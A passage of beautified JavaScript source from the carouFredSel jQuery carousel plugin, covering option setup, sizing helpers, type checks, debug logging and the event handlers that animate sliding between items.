        a[b.d.width] = ms_getTrueLargestSize(c, b, "outerWidth")) : a[b.d.width] = ms_hasVariableSizes(c, b, "outerWidth") ? "variable" : c[b.d.outerWidth](!0)),
        a[b.d.height] || (a[b.d.height] = ms_hasVariableSizes(c, b, "outerHeight") ? "variable" : c[b.d.outerHeight](!0)),
        a.sizesConf.width = a.width,
        a.sizesConf.height = a.height,
        a
    }
    function in_complementVisibleItems(a, b) {
        return "variable" == a.items[a.d.width] && (a.items.visibleConf.variable = !0),
        a.items.visibleConf.variable || (is_number(a[a.d.width]) ? a.items.visible = Math.floor(a[a.d.width] / a.items[a.d.width]) : (a.items.visible = Math.floor(b / a.items[a.d.width]),
        a[a.d.width] = a.items.visible * a.items[a.d.width],
        a.items.visibleConf.adjust || (a.align = !1)),
        ("Infinity" == a.items.visible || 1 > a.items.visible) && (debug(!0, 'Not a valid number of visible items: Set to "variable".'),
        a.items.visibleConf.variable = !0)),
        a
    }
    function in_complementPrimarySize(a, b, c) {
        return "auto" == a && (a = ms_getTrueLargestSize(c, b, "outerWidth")),
        a
    }
    function in_complementSecondarySize(a, b, c) {
        return "auto" == a && (a = ms_getTrueLargestSize(c, b, "outerHeight")),
        a || (a = b.items[b.d.height]),
        a
    }
    function in_getAlignPadding(a, b) {
        var c = cf_getAlignPadding(gi_getCurrentItems(b, a), a);
        return a.padding[a.d[1]] = c[1],
        a.padding[a.d[3]] = c[0],
        a
    }
    function in_getResponsiveValues(a, b) {
        var d = cf_getItemAdjustMinMax(Math.ceil(a[a.d.width] / a.items[a.d.width]), a.items.visibleConf);
        d > b.length && (d = b.length);
        var e = Math.floor(a[a.d.width] / d);
        return a.items.visible = d,
        a.items[a.d.width] = e,
        a[a.d.width] = d * e,
        a
    }
    function bt_pauseOnHoverConfig(a) {
        if (is_string(a))
            var b = a.indexOf("immediate") > -1 ? !0 : !1
              , c = a.indexOf("resume") > -1 ? !0 : !1;
        else
            var b = c = !1;
        return [b, c]
    }
    function bt_mousesheelNumber(a) {
        return is_number(a) ? a : null
    }
    function is_null(a) {
        return null === a
    }
    function is_undefined(a) {
        return is_null(a) || a === void 0 || "" === a || "undefined" === a
    }
    function is_array(a) {
        return a instanceof Array
    }
    function is_jquery(a) {
        return a instanceof jQuery
    }
    function is_object(a) {
        return (a instanceof Object || "object" == typeof a) && !is_null(a) && !is_jquery(a) && !is_array(a) && !is_function(a)
    }
    function is_number(a) {
        return (a instanceof Number || "number" == typeof a) && !isNaN(a)
    }
    function is_string(a) {
        return (a instanceof String || "string" == typeof a) && !is_undefined(a) && !is_true(a) && !is_false(a)
    }
    function is_function(a) {
        return a instanceof Function || "function" == typeof a
    }
    function is_boolean(a) {
        return a instanceof Boolean || "boolean" == typeof a || is_true(a) || is_false(a)
    }
    function is_true(a) {
        return a === !0 || "true" === a
    }
    function is_false(a) {
        return a === !1 || "false" === a
    }
    function is_percentage(a) {
        return is_string(a) && "%" == a.slice(-1)
    }
    function getTime() {
        return (new Date).getTime()
    }
    function deprecated(a, b) {
        debug(!0, a + " is DEPRECATED, support for it will be removed. Use " + b + " instead.")
    }
    function debug(a, b) {
        if (!is_undefined(window.console) && !is_undefined(window.console.log)) {
            if (is_object(a)) {
                var c = " (" + a.selector + ")";
                a = a.debug
            } else
                var c = "";
            if (!a)
                return !1;
            b = is_string(b) ? "carouFredSel" + c + ": " + b : ["carouFredSel" + c + ":", b],
            window.console.log(b)
        }
        return !1
    }
    $.fn.carouFredSel || ($.fn.caroufredsel = $.fn.carouFredSel = function(options, configs) {
        if (0 == this.length)
            return debug(!0, 'No element found for "' + this.selector + '".'),
            this;
        if (this.length > 1)
            return this.each(function() {
                $(this).carouFredSel(options, configs)
            });
        var $cfs = this
          , $tt0 = this[0]
          , starting_position = !1;
        $cfs.data("_cfs_isCarousel") && (starting_position = $cfs.triggerHandler("_cfs_triggerEvent", "currentPosition"),
        $cfs.trigger("_cfs_triggerEvent", ["destroy", !0]));
        var FN = {};
        FN._init = function(a, b, c) {
            a = go_getObject($tt0, a),
            a.items = go_getItemsObject($tt0, a.items),
            a.scroll = go_getScrollObject($tt0, a.scroll),
            a.auto = go_getAutoObject($tt0, a.auto),
            a.prev = go_getPrevNextObject($tt0, a.prev),
            a.next = go_getPrevNextObject($tt0, a.next),
            a.pagination = go_getPaginationObject($tt0, a.pagination),
            a.swipe = go_getSwipeObject($tt0, a.swipe),
            a.mousewheel = go_getMousewheelObject($tt0, a.mousewheel),
            b && (opts_orig = $.extend(!0, {}, $.fn.carouFredSel.defaults, a)),
            opts = $.extend(!0, {}, $.fn.carouFredSel.defaults, a),
            opts.d = cf_getDimensions(opts),
            crsl.direction = "up" == opts.direction || "left" == opts.direction ? "next" : "prev";
            var d = $cfs.children()
              , e = ms_getParentSize($wrp, opts, "width");
            if (is_true(opts.cookie) && (opts.cookie = "caroufredsel_cookie_" + conf.serialNumber),
            opts.maxDimension = ms_getMaxDimension(opts, e),
            opts.items = in_complementItems(opts.items, opts, d, c),
            opts[opts.d.width] = in_complementPrimarySize(opts[opts.d.width], opts, d),
            opts[opts.d.height] = in_complementSecondarySize(opts[opts.d.height], opts, d),
            opts.responsive && (is_percentage(opts[opts.d.width]) || (opts[opts.d.width] = "100%")),
            is_percentage(opts[opts.d.width]) && (crsl.upDateOnWindowResize = !0,
            crsl.primarySizePercentage = opts[opts.d.width],
            opts[opts.d.width] = ms_getPercentage(e, crsl.primarySizePercentage),
            opts.items.visible || (opts.items.visibleConf.variable = !0)),
            opts.responsive ? (opts.usePadding = !1,
            opts.padding = [0, 0, 0, 0],
            opts.align = !1,
            opts.items.visibleConf.variable = !1) : (opts.items.visible || (opts = in_complementVisibleItems(opts, e)),
            opts[opts.d.width] || (!opts.items.visibleConf.variable && is_number(opts.items[opts.d.width]) && "*" == opts.items.filter ? (opts[opts.d.width] = opts.items.visible * opts.items[opts.d.width],
            opts.align = !1) : opts[opts.d.width] = "variable"),
            is_undefined(opts.align) && (opts.align = is_number(opts[opts.d.width]) ? "center" : !1),
            opts.items.visibleConf.variable && (opts.items.visible = gn_getVisibleItemsNext(d, opts, 0))),
            "*" == opts.items.filter || opts.items.visibleConf.variable || (opts.items.visibleConf.org = opts.items.visible,
            opts.items.visible = gn_getVisibleItemsNextFilter(d, opts, 0)),
            opts.items.visible = cf_getItemsAdjust(opts.items.visible, opts, opts.items.visibleConf.adjust, $tt0),
            opts.items.visibleConf.old = opts.items.visible,
            opts.responsive)
                opts.items.visibleConf.min || (opts.items.visibleConf.min = opts.items.visible),
                opts.items.visibleConf.max || (opts.items.visibleConf.max = opts.items.visible),
                opts = in_getResponsiveValues(opts, d, e);
            else
                switch (opts.padding = cf_getPadding(opts.padding),
                "top" == opts.align ? opts.align = "left" : "bottom" == opts.align && (opts.align = "right"),
                opts.align) {
                case "center":
                case "left":
                case "right":
                    "variable" != opts[opts.d.width] && (opts = in_getAlignPadding(opts, d),
                    opts.usePadding = !0);
                    break;
                default:
                    opts.align = !1,
                    opts.usePadding = 0 == opts.padding[0] && 0 == opts.padding[1] && 0 == opts.padding[2] && 0 == opts.padding[3] ? !1 : !0
                }
            is_number(opts.scroll.duration) || (opts.scroll.duration = 500),
            is_undefined(opts.scroll.items) && (opts.scroll.items = opts.responsive || opts.items.visibleConf.variable || "*" != opts.items.filter ? "visible" : opts.items.visible),
            opts.auto = $.extend(!0, {}, opts.scroll, opts.auto),
            opts.prev = $.extend(!0, {}, opts.scroll, opts.prev),
            opts.next = $.extend(!0, {}, opts.scroll, opts.next),
            opts.pagination = $.extend(!0, {}, opts.scroll, opts.pagination),
            opts.auto = go_complementAutoObject($tt0, opts.auto),
            opts.prev = go_complementPrevNextObject($tt0, opts.prev),
            opts.next = go_complementPrevNextObject($tt0, opts.next),
            opts.pagination = go_complementPaginationObject($tt0, opts.pagination),
            opts.swipe = go_complementSwipeObject($tt0, opts.swipe),
            opts.mousewheel = go_complementMousewheelObject($tt0, opts.mousewheel),
            opts.synchronise && (opts.synchronise = cf_getSynchArr(opts.synchronise)),
            opts.auto.onPauseStart && (opts.auto.onTimeoutStart = opts.auto.onPauseStart,
            deprecated("auto.onPauseStart", "auto.onTimeoutStart")),
            opts.auto.onPausePause && (opts.auto.onTimeoutPause = opts.auto.onPausePause,
            deprecated("auto.onPausePause", "auto.onTimeoutPause")),
            opts.auto.onPauseEnd && (opts.auto.onTimeoutEnd = opts.auto.onPauseEnd,
            deprecated("auto.onPauseEnd", "auto.onTimeoutEnd")),
            opts.auto.pauseDuration && (opts.auto.timeoutDuration = opts.auto.pauseDuration,
            deprecated("auto.pauseDuration", "auto.timeoutDuration"))
        }
        ,
        FN._build = function() {
            $cfs.data("_cfs_isCarousel", !0);
            var a = $cfs.children()
              , b = in_mapCss($cfs, ["textAlign", "float", "position", "top", "right", "bottom", "left", "zIndex", "width", "height", "marginTop", "marginRight", "marginBottom", "marginLeft"])
              , c = "relative";
            switch (b.position) {
            case "absolute":
            case "fixed":
                c = b.position
            }
            "parent" == conf.wrapper ? sz_storeOrigCss($wrp) : $wrp.css(b),
            $wrp.css({
                overflow: "hidden",
                position: c
            }),
            sz_storeOrigCss($cfs),
            $cfs.data("_cfs_origCssZindex", b.zIndex),
            $cfs.css({
                textAlign: "left",
                "float": "none",
                position: "absolute",
                top: 0,
                right: "auto",
                bottom: "auto",
                left: 0,
                marginTop: 0,
                marginRight: 0,
                marginBottom: 0,
                marginLeft: 0
            }),
            sz_storeMargin(a, opts),
            sz_storeOrigCss(a),
            opts.responsive && sz_setResponsiveSizes(opts, a)
        }
        ,
        FN._bind_events = function() {
            FN._unbind_events(),
            $cfs.bind(cf_e("stop", conf), function(a, b) {
                return a.stopPropagation(),
                crsl.isStopped || opts.auto.button && opts.auto.button.addClass(cf_c("stopped", conf)),
                crsl.isStopped = !0,
                opts.auto.play && (opts.auto.play = !1,
                $cfs.trigger(cf_e("pause", conf), b)),
                !0
            }),
            $cfs.bind(cf_e("finish", conf), function(a) {
                return a.stopPropagation(),
                crsl.isScrolling && sc_stopScroll(scrl),
                !0
            }),
            $cfs.bind(cf_e("pause", conf), function(a, b, c) {
                if (a.stopPropagation(),
                tmrs = sc_clearTimers(tmrs),
                b && crsl.isScrolling) {
                    scrl.isStopped = !0;
                    var d = getTime() - scrl.startTime;
                    scrl.duration -= d,
                    scrl.pre && (scrl.pre.duration -= d),
                    scrl.post && (scrl.post.duration -= d),
                    sc_stopScroll(scrl, !1)
                }
                if (crsl.isPaused || crsl.isScrolling || c && (tmrs.timePassed += getTime() - tmrs.startTime),
                crsl.isPaused || opts.auto.button && opts.auto.button.addClass(cf_c("paused", conf)),
                crsl.isPaused = !0,
                opts.auto.onTimeoutPause) {
                    var e = opts.auto.timeoutDuration - tmrs.timePassed
                      , f = 100 - Math.ceil(100 * e / opts.auto.timeoutDuration);
                    opts.auto.onTimeoutPause.call($tt0, f, e)
                }
                return !0
            }),
            $cfs.bind(cf_e("play", conf), function(a, b, c, d) {
                a.stopPropagation(),
                tmrs = sc_clearTimers(tmrs);
                var e = [b, c, d]
                  , f = ["string", "number", "boolean"]
                  , g = cf_sortParams(e, f);
                if (b = g[0],
                c = g[1],
                d = g[2],
                "prev" != b && "next" != b && (b = crsl.direction),
                is_number(c) || (c = 0),
                is_boolean(d) || (d = !1),
                d && (crsl.isStopped = !1,
                opts.auto.play = !0),
                !opts.auto.play)
                    return a.stopImmediatePropagation(),
                    debug(conf, "Carousel stopped: Not scrolling.");
                crsl.isPaused && opts.auto.button && (opts.auto.button.removeClass(cf_c("stopped", conf)),
                opts.auto.button.removeClass(cf_c("paused", conf))),
                crsl.isPaused = !1,
                tmrs.startTime = getTime();
                var h = opts.auto.timeoutDuration + c;
                return dur2 = h - tmrs.timePassed,
                perc = 100 - Math.ceil(100 * dur2 / h),
                opts.auto.progress && (tmrs.progress = setInterval(function() {
                    var a = getTime() - tmrs.startTime + tmrs.timePassed
                      , b = Math.ceil(100 * a / h);
                    opts.auto.progress.updater.call(opts.auto.progress.bar[0], b)
                }, opts.auto.progress.interval)),
                tmrs.auto = setTimeout(function() {
                    opts.auto.progress && opts.auto.progress.updater.call(opts.auto.progress.bar[0], 100),
                    opts.auto.onTimeoutEnd && opts.auto.onTimeoutEnd.call($tt0, perc, dur2),
                    crsl.isScrolling ? $cfs.trigger(cf_e("play", conf), b) : $cfs.trigger(cf_e(b, conf), opts.auto)
                }, dur2),
                opts.auto.onTimeoutStart && opts.auto.onTimeoutStart.call($tt0, perc, dur2),
                !0
            }),
            $cfs.bind(cf_e("resume", conf), function(a) {
                return a.stopPropagation(),
                scrl.isStopped ? (scrl.isStopped = !1,
                crsl.isPaused = !1,
                crsl.isScrolling = !0,
                scrl.startTime = getTime(),
                sc_startScroll(scrl, conf)) : $cfs.trigger(cf_e("play", conf)),
                !0
            }),
            $cfs.bind(cf_e("prev", conf) + " " + cf_e("next", conf), function(a, b, c, d, e) {
                if (a.stopPropagation(),
                crsl.isStopped || $cfs.is(":hidden"))
                    return a.stopImmediatePropagation(),
                    debug(conf, "Carousel stopped or hidden: Not scrolling.");
                var f = is_number(opts.items.minimum) ? opts.items.minimum : opts.items.visible + 1;
                if (f > itms.total)
                    return a.stopImmediatePropagation(),
                    debug(conf, "Not enough items (" + itms.total + " total, " + f + " needed): Not scrolling.");
                var g = [b, c, d, e]
                  , h = ["object", "number/string", "function", "boolean"]
                  , i = cf_sortParams(g, h);
                b = i[0],
                c = i[1],
                d = i[2],
                e = i[3];
                var j = a.type.slice(conf.events.prefix.length);
                if (is_object(b) || (b = {}),
                is_function(d) && (b.onAfter = d),
                is_boolean(e) && (b.queue = e),
                b = $.extend(!0, {}, opts[j], b),
                b.conditions && !b.conditions.call($tt0, j))
                    return a.stopImmediatePropagation(),
                    debug(conf, 'Callback "conditions" returned false.');
                if (!is_number(c)) {
                    if ("*" != opts.items.filter)
                        c = "visible";
                    else
                        for (var k = [c, b.items, opts[j].items], i = 0, l = k.length; l > i; i++)
                            if (is_number(k[i]) || "page" == k[i] || "visible" == k[i]) {
                                c = k[i];
                                break
                            }
                    switch (c) {
                    case "page":
                        return a.stopImmediatePropagation(),
                        $cfs.triggerHandler(cf_e(j + "Page", conf), [b, d]);
                    case "visible":
                        opts.items.visibleConf.variable || "*" != opts.items.filter || (c = opts.items.visible)
                    }
                }
                if (scrl.isStopped)
                    return $cfs.trigger(cf_e("resume", conf)),
                    $cfs.trigger(cf_e("queue", conf), [j, [b, c, d]]),
                    a.stopImmediatePropagation(),
                    debug(conf, "Carousel resumed scrolling.");
                if (b.duration > 0 && crsl.isScrolling)
                    return b.queue && ("last" == b.queue && (queu = []),
                    ("first" != b.queue || 0 == queu.length) && $cfs.trigger(cf_e("queue", conf), [j, [b, c, d]])),
                    a.stopImmediatePropagation(),
                    debug(conf, "Carousel currently scrolling.");
                if (tmrs.timePassed = 0,
                $cfs.trigger(cf_e("slide_" + j, conf), [b, c]),
                opts.synchronise)
                    for (var m = opts.synchronise, n = [b, c], o = 0, l = m.length; l > o; o++) {
                        var p = j;
                        m[o][2] || (p = "prev" == p ? "next" : "prev"),
                        m[o][1] || (n[0] = m[o][0].triggerHandler("_cfs_triggerEvent", ["configuration", p])),
                        n[1] = c + m[o][3],
                        m[o][0].trigger("_cfs_triggerEvent", ["slide_" + p, n])
                    }
                return !0
            }),
            $cfs.bind(cf_e("slide_prev", conf), function(a, b, c) {
                a.stopPropagation();
                var d = $cfs.children();
                if (!opts.circular && 0 == itms.first)
                    return opts.infinite && $cfs.trigger(cf_e("next", conf), itms.total - 1),
                    a.stopImmediatePropagation();
                if (sz_resetMargin(d, opts),
                !is_number(c)) {
                    if (opts.items.visibleConf.variable)
                        c = gn_getVisibleItemsPrev(d, opts, itms.total - 1);
                    else if ("*" != opts.items.filter) {
                        var e = is_number(b.items) ? b.items : gn_getVisibleOrg($cfs, opts);
                        c = gn_getScrollItemsPrevFilter(d, opts, itms.total - 1, e)
                    } else
                        c = opts.items.visible;
                    c = cf_getAdjust(c, opts, b.items, $tt0)
                }
                if (opts.circular || itms.total - c < itms.first && (c = itms.total - itms.first),
                opts.items.visibleConf.old = opts.items.visible,
                opts.items.visibleConf.variable) {
                    var f = cf_getItemsAdjust(gn_getVisibleItemsNext(d, opts, itms.total - c), opts, opts.items.visibleConf.adjust, $tt0);
                    f >= opts.items.visible + c && itms.total > c && (c++,
                    f = cf_getItemsAdjust(gn_getVisibleItemsNext(d, opts, itms.total - c), opts, opts.items.visibleConf.adjust, $tt0)),
                    opts.items.visible = f
                } else if ("*" != opts.items.filter) {
                    var f = gn_getVisibleItemsNextFilter(d, opts, itms.total - c);
                    opts.items.visible = cf_getItemsAdjust(f, opts, opts.items.visibleConf.adjust, $tt0)
                }
                if (sz_resetMargin(d, opts, !0),
                0 == c)
                    return a.stopImmediatePropagation(),
                    debug(conf, "0 items to scroll: Not scrolling.");
                for (debug(conf, "Scrolling " + c + " items backward."),
                itms.first += c; itms.first >= itms.total; )
                    itms.first -= itms.total;
                opts.circular || (0 == itms.first && b.onEnd && b.onEnd.call($tt0, "prev"),
                opts.infinite || nv_enableNavi(opts, itms.first, conf)),
                $cfs.children().slice(itms.total - c, itms.total).prependTo($cfs),
                itms.total < opts.items.visible + c && $cfs.children().slice(0, opts.items.visible + c - itms.total).clone(!0).appendTo($cfs);
                var d = $cfs.children()
                  , g = gi_getOldItemsPrev(d, opts, c)
                  , h = gi_getNewItemsPrev(d, opts)
                  , i = d.eq(c - 1)
                  , j = g.last()
                  , k = h.last();
                sz_resetMargin(d, opts);
                var l = 0
                  , m = 0;
                if (opts.align) {
                    var n = cf_getAlignPadding(h, opts);
                    l = n[0],
                    m = n[1]
                }
                var o = 0 > l ? opts.padding[opts.d[3]] : 0
                  , p = !1
                  , q = $();
                if (c > opts.items.visible && (q = d.slice(opts.items.visibleConf.old, c),
                "directscroll" == b.fx)) {
                    var r = opts.items[opts.d.width];
                    p = q,
                    i = k,
                    sc_hideHiddenItems(p),
                    opts.items[opts.d.width] = "variable"
                }
                var s = !1
                  , t = ms_getTotalSize(d.slice(0, c), opts, "width")
                  , u = cf_mapWrapperSizes(ms_getSizes(h, opts, !0), opts, !opts.usePadding)
                  , v = 0
                  , w = {}
                  , x = {}
                  , y = {}
                  , z = {}
                  , A = {}
                  , B = {}
                  , C = {}
                  , D = sc_getDuration(b, opts, c, t);
                switch (b.fx) {
                case "cover":
                case "cover-fade":
                    v = ms_getTotalSize(d.slice(0, opts.items.visible), opts, "width")
                }
                p && (opts.items[opts.d.width] = r),
                sz_resetMargin(d, opts, !0),
                m >= 0 && sz_resetMargin(j, opts, opts.padding[opts.d[1]]),
                l >= 0 && sz_resetMargin(i, opts, opts.padding[opts.d[3]]),
                opts.align && (opts.padding[opts.d[1]] = m,
                opts.padding[opts.d[3]] = l),
                B[opts.d.left] = -(t - o),
                C[opts.d.left] = -(v - o),
                x[opts.d.left] = u[opts.d.width];
                var E = function() {}
                  , F = function() {}
                  , G = function() {}
                  , H = function() {}
                  , I = function() {}
                  , J = function() {}
                  , K = function() {}
                  , L = function() {}
                  , M = function() {}
                  , N = function() {}
                  , O = function() {};
                switch (b.fx) {
                case "crossfade":
                case "cover":
                case "cover-fade":
                case "uncover":
                case "uncover-fade":
                    s = $cfs.clone(!0).appendTo($wrp)
                }
                switch (b.fx) {
                case "crossfade":
                case "uncover":
                case "uncover-fade":
                    s.children().slice(0, c).remove(),
                    s.children().slice(opts.items.visibleConf.old).remove();
                    break;
                case "cover":
                case "cover-fade":
                    s.children().slice(opts.items.visible).remove(),
                    s.css(C)
                }
                if ($cfs.css(B),
                scrl = sc_setScroll(D, b.easing, conf),
                w[opts.d.left] = opts.usePadding ? opts.padding[opts.d[3]] : 0,
                ("variable" == opts[opts.d.width] || "variable" == opts[opts.d.height]) && (E = function() {
                    $wrp.css(u)
                }
                ,
                F = function() {
                    scrl.anims.push([$wrp, u])
                }
                ),
                opts.usePadding) {
                    switch (k.not(i).length && (y[opts.d.marginRight] = i.data("_cfs_origCssMargin"),
                    0 > l ? i.css(y) : (K = function() {
                        i.css(y)
                    }
                    ,
                    L = function() {
                        scrl.anims.push([i, y])
                    }
                    )),
                    b.fx) {
                    case "cover":
                    case "cover-fade":
                        s.children().eq(c - 1).css(y)
                    }
                    k.not(j).length && (z[opts.d.marginRight] = j.data("_cfs_origCssMargin"),
                    G = function() {
                        j.css(z)
                    }
                    ,
                    H = function() {
                        scrl.anims.push([j, z])
                    }
                    ),
                    m >= 0 && (A[opts.d.marginRight] = k.data("_cfs_origCssMargin") + opts.padding[opts.d[1]],
                    I = function() {
                        k.css(A)
                    }
                    ,
                    J = function() {
                        scrl.anims.push([k, A])
                    }
                    )
                }
                O = function() {
                    $cfs.css(w)
                }
                ;
                var P = opts.items.visible + c - itms.total;
                N = function() {
                    if (P > 0 && ($cfs.children().slice(itms.total).remove(),
                    g = $($cfs.children().slice(itms.total - (opts.items.visible - P)).get().concat($cfs.children().slice(0, P).get()))),
                    sc_showHiddenItems(p),
                    opts.usePadding) {
                        var a = $cfs.children().eq(opts.items.visible + c - 1);
                        a.css(opts.d.marginRight, a.data("_cfs_origCssMargin"))
                    }
                }
                ;
                var Q = sc_mapCallbackArguments(g, q, h, c, "prev", D, u);
                switch (M = function() {
                    sc_afterScroll($cfs, s, b),
                    crsl.isScrolling = !1,
                    clbk.onAfter = sc_fireCallbacks($tt0, b, "onAfter", Q, clbk),
                    queu = sc_fireQueue($cfs, queu, conf),
                    crsl.isPaused || $cfs.trigger(cf_e("play", conf))
                }
                ,
                crsl.isScrolling = !0,
                tmrs = sc_clearTimers(tmrs),
                clbk.onBefore = sc_fireCallbacks($tt0, b, "onBefore", Q, clbk),
                b.fx) {
                case "none":
                    $cfs.css(w),
                    E(),
                    G(),
                    I(),
                    K(),
                    O(),
                    N(),
                    M();
                    break;
                case "fade":
                    scrl.anims.push([$cfs, {
                        opacity: 0
                    }, function() {
                        E(),
                        G(),
                        I(),
                        K(),
                        O(),
                        N(),
                        scrl = sc_setScroll(D, b.easing, conf),
                        scrl.anims.push([$cfs, {
                            opacity: 1
                        }, M]),
                        sc_startScroll(scrl, conf)
                    }
                    ]);
                    break;
                case "crossfade":
                    $cfs.css({
                        opacity: 0
                    }),
                    scrl.anims.push([s, {
                        opacity: 0
                    }]),
                    scrl.anims.push([$cfs, {
                        opacity: 1
                    }, M]),
                    F(),
                    G(),
                    I(),
                    K(),
                    O(),
                    N();
                    break;
                case "cover":
                    scrl.anims.push([s, w, function() {
                        G(),
                        I(),
                        K(),
                        O(),
                        N(),
                        M()
                    }
                    ]),
                    F();
                    break;
                case "cover-fade":
                    scrl.anims.push([$cfs, {
                        opacity: 0
                    }]),
                    scrl.anims.push([s, w, function() {
                        G(),
                        I(),
                        K(),
                        O(),
                        N(),
                        M()
                    }
                    ]),
                    F();
                    break;
                case "uncover":
                    scrl.anims.push([s, x, M]),
                    F(),
                    G(),
                    I(),
                    K(),
                    O(),
                    N();
                    break;
                case "uncover-fade":
                    $cfs.css({
                        opacity: 0
                    }),
                    scrl.anims.push([$cfs, {
                        opacity: 1
                    }]),
                    scrl.anims.push([s, x, M]),
                    F(),
                    G(),
                    I(),
                    K(),
                    O(),
                    N();
                    break;
                default:
                    scrl.anims.push([$cfs, w, function() {
                        N(),
                        M()
                    }
                    ]),
                    F(),
                    H(),
                    J(),
                    L()
                }
                return sc_startScroll(scrl, conf),
                cf_setCookie(opts.cookie, $cfs, conf),
                $cfs.trigger(cf_e("updatePageStatus", conf), [!1, u]),
                !0
            }),
            $cfs.bind(cf_e("slide_next", conf), function(a, b, c) {
                a.stopPropagation();
                var d = $cfs.children();
                if (!opts.circular && itms.first == opts.items.visible)
                    return opts.infinite && $cfs.trigger(cf_e("prev", conf), itms.total - 1),
                    a.stopImmediatePropagation();
                if (sz_resetMargin(d, opts),
                !is_number(c)) {
                    if ("*" != opts.items.filter) {
                        var e = is_number(b.items) ? b.items : gn_getVisibleOrg($cfs, opts);
                        c = gn_getScrollItemsNextFilter(d, opts, 0, e)
                    } else
                        c = opts.items.visible;
                    c = cf_getAdjust(c, opts, b.items, $tt0)
                }
                var f = 0 == itms.first ? itms.total : itms.first;
                if (!opts.circular) {
                    if (opts.items.visibleConf.variable)
                        var g = gn_getVisibleItemsNext(d, opts, c)
                          , e = gn_getVisibleItemsPrev(d, opts, f - 1);
                    else
                        var g = opts.items.visible
                          , e = opts.items.visible;
                    c + g > f && (c = f - e)
                }
                if (opts.items.visibleConf.old = opts.items.visible,
                opts.items.visibleConf.variable) {
                    for (var g = cf_getItemsAdjust(gn_getVisibleItemsNextTestCircular(d, opts, c, f), opts, opts.items.visibleConf.adjust, $tt0); opts.items.visible - c >= g && itms.total > c; )
                        c++,
                        g = cf_getItemsAdjust(gn_getVisibleItemsNextTestCircular(d, opts, c, f), opts, opts.items.visibleConf.adjust, $tt0);
                    opts.items.visible = g
                } else if ("*" != opts.items.filter) {
                    var g = gn_getVisibleItemsNextFilter(d, opts, c);
                    opts.items.visible = cf_getItemsAdjust(g, opts, opts.items.visibleConf.adjust, $tt0)
                }
                if (sz_resetMargin(d, opts, !0),
                0 == c)
                    return a.stopImmediatePropagation(),
                    debug(conf, "0 items to scroll: Not scrolling.");
                for (debug(conf, "Scrolling " + c + " items forward."),
                itms.first -= c; 0 > itms.first; )
                    itms.first += itms.total;
                opts.circular || (itms.first == opts.items.visible && b.onEnd && b.onEnd.call($tt0, "next"),
                opts.infinite || nv_enableNavi(opts, itms.first, conf)),
                itms.total < opts.items.visible + c && $cfs.children().slice(0, opts.items.visible + c - itms.total).clone(!0).appendTo($cfs);
                var d = $cfs.children()
                  , h = gi_getOldItemsNext(d, opts)
                  , i = gi_getNewItemsNext(d, opts, c)
                  , j = d.eq(c - 1)
                  , k = h.last()
                  , l = i.last();
                sz_resetMargin(d, opts);
                var m = 0
                  , n = 0;
                if (opts.align) {
                    var o = cf_getAlignPadding(i, opts);
                    m = o[0],
                    n = o[1]
                }
                var p = !1
                  , q = $();
                if (c > opts.items.visibleConf.old && (q = d.slice(opts.items.visibleConf.old, c),
                "directscroll" == b.fx)) {
                    var r = opts.items[opts.d.width];
                    p = q,
                    j = k,
                    sc_hideHiddenItems(p),
                    opts.items[opts.d.width] = "variable"
                }
                var s = !1
                  , t = ms_getTotalSize(d.slice(0, c), opts, "width")
                  , u = cf_mapWrapperSizes(ms_getSizes(i, opts, !0), opts, !opts.usePadding)
                  , v = 0
                  , w = {}
                  , x = {}
                  , y = {}
                  , z = {}
                  , A = {}
                  , B = sc_getDuration(b, opts, c, t);
                switch (b.fx) {
                case "uncover":
                case "uncover-fade":
                    v = ms_getTotalSize(d.slice(0, opts.items.visibleConf.old), opts, "width")
                }
                p && (opts.items[opts.d.width] = r),
                opts.align && 0 > opts.padding[opts.d[1]] && (opts.padding[opts.d[1]] = 0),
                sz_resetMargin(d, opts, !0),
                sz_resetMargin(k, opts, opts.padding[opts.d[1]]),
                opts.align && (opts.padding[opts.d[1]] = n,
                opts.padding[opts.d[3]] = m),
                A[opts.d.left] = opts.usePadding ? opts.padding[opts.d[3]] : 0;
                var C = function() {}
                  , D = function() {}
                  , E = function() {}
                  , F = function() {}
                  , G = function() {}
                  , H = function() {}
                  , I = function() {}
                  , J = function() {}
                  , K = function() {};
                switch (b.fx) {
                case "crossfade":
                case "cover":
                case "cover-fade":
                case "uncover":
                case "uncover-fade":
                    s = $cfs.clone(!0).appendTo($wrp),
                    s.children().slice(opts.items.visibleConf.old).remove()
                }
                switch (b.fx) {
                case "crossfade":
                case "cover":
                case "cover-fade":
                    $cfs.css("zIndex", 1),
                    s.css("zIndex", 0)
                }
                if (scrl = sc_setScroll(B, b.easing, conf),
                w[opts.d.left] = -t,
                x[opts.d.left] = -v,
                0 > m && (w[opts.d.left] += m),
                ("variable" == opts[opts.d.width] || "variable" == opts[opts.d.height]) && (C = function() {
                    $wrp.css(u)
                }
                ,
                D = function() {
                    scrl.anims.push([$wrp, u])
                }
                ),
                opts.usePadding) {
                    var L = l.data("_cfs_origCssMargin");
                    n >= 0 && (L += opts.padding[opts.d[1]]),
                    l.css(opts.d.marginRight, L),
                    j.not(k).length && (z[opts.d.marginRight] = k.data("_cfs_origCssMargin")),
                    E = function() {
                        k.css(z)
                    }
                    ,
                    F = function() {
                        scrl.anims.push([k, z])
                    }
                    ;
                    var M = j.data("_cfs_origCssMargin");
                    m > 0 && (M += opts.padding[opts.d[3]]),
                    y[opts.d.marginRight] = M,
                    G = function() {
                        j.css(y)
                    }
                    ,
                    H = function() {
                        scrl.anims.push([j, y])
                    }
                }
                K = function() {
                    $cfs.css(A)
                }
                ;
                var N = opts.items.visible + c - itms.total;
                J = function() {
                    N > 0 && $cfs.children().slice(itms.total).remove();
                    var a = $cfs.children().slice(0, c).appendTo($cfs).last();
                    if (N > 0 && (i = gi_getCurrentItems(d, opts)),
                    sc_showHiddenItems(p),
                    opts.usePadding) {
                        if (itms.total < opts.items.visible + c) {
                            var b = $cfs.children().eq(opts.items.visible - 1);
                            b.css(opts.d.marginRight, b.data("_cfs_origCssMargin") + opts.padding[opts.d[1]])
                        }
                        a.css(opts.d.marginRight, a.data("_cfs_origCssMargin"))
                    }
                }
                ;
                var O = sc_mapCallbackArguments(h, q, i, c, "next", B, u);
                switch (I = function() {
                    $cfs.css("zIndex", $cfs.data("_cfs_origCssZindex")),
                    sc_afterScroll($cfs, s, b),
                    crsl.isScrolling = !1,
                    clbk.onAfter = sc_fireCallbacks($tt0, b, "onAfter", O, clbk),
                    queu = sc_fireQueue($cfs, queu, conf),
                    crsl.isPaused || $cfs.trigger(cf_e("play", conf))
                }
                ,
                crsl.isScrolling = !0,
                tmrs = sc_clearTimers(tmrs),
